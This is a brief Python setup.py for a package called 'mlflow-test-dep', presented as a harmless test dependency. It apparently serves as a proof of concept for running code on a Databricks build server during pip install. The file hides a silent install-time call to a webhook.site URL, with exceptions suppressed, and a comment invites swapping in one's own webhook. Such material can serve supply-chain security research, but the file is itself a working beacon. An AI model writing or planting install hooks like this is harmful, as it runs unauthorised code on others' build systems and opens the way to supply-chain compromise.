   from setuptools import setup
   import urllib.request

   # This code executes ON THE DATABRICKS BUILD SERVER during pip install
   try:
       # Replace with your actual webhook URL
       urllib.request.urlopen("https://webhook.site/9add281a-130c-490d-8320-f0f01c276bda")
   except Exception:
       pass

   setup(
       name="mlflow-test-dep",
       version="0.1",
       description="A test dependency"
   )
